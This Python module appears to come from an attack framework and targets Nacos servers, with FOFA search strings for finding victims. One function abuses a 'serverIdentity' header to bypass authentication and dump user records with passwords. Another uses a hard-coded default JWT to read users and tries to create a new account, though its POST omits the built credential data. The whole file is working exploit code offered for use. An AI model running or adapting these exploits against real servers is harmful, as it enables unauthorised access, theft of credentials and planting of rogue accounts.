from lib.util.exprequest import ExpRequest
from lib.util.output import Output
from lib.util.fun import randomLowercase
import lib.util.globalvar as GlobalVar
class nacos():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = env.get('url')
        self.cookie = env.get('cookie')
        self.cmd = env.get('cmd')
        self.pocname = env.get('pocname')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        self.flag = GlobalVar.get_value('flag')
        
    def nacos_auth_leak(self):
        """
        fofa: app="NACOS"
        """
        appName = 'nacos'
        pocname = 'nacos_auth_leak'
        method = 'get'
        path = '/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken='
        headers = {"serverIdentity":"security"}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            #_verify
            if self.vuln == 'False':
                r = exprequest.get(self.url+path,headers=headers)
                if 'password' in r.text:
                    return output.echo_success(method)
                return output.fail()
            #_attack
            else:
                import json
                r = exprequest.get(self.url+path,headers=headers)
                if 'password' in r.text:
                    json_load = json.loads(r.text)
                    print(json.dumps(json_load, indent=4))
        except Exception as error:
            return output.error_output(str(error))

    def nacos_auth_default_token(self):
        """
        fofa: app="NACOS"
        """
        appName = 'nacos'
        pocname = 'nacos_auth_leak'
        method = 'get'
        path = '/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ&pageNo=1&pageSize=9'
        headers = {"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ"}
        #输出类
        output = Output(self.url, appName, pocname)
        #请求类
        exprequest = ExpRequest(output)
        try:
            #_verify
            if self.vuln == 'False':
                r = exprequest.get(self.url+path,headers=headers)
                if 'password' in r.text:
                    return output.echo_success(method)
                return output.fail()
            #_attack
            else:
                headers = {"Authorization":"Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY5ODg5NDcyN30.feetKmWoPnMkAebjkNnyuKo6c21_hzTgu0dfNqbdpZQ"}
                name = randomLowercase(8)
                data = 'username=%s&password=%s'%(name,name)
                r = exprequest.post(self.url+'/nacos/v1/auth/users', headers=headers)
                if 'create user ok' in r.text:
                    print(data)
        except Exception as error:
            return output.error_output(str(error))

def check(**kwargs):
    thread_list = []
    Expnacos = nacos(**kwargs)
    #调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(Expnacos, kwargs['pocname'])))
    #调用所有函数
    else:
        for func in dir(nacos):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(Expnacos, func)))
    #保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)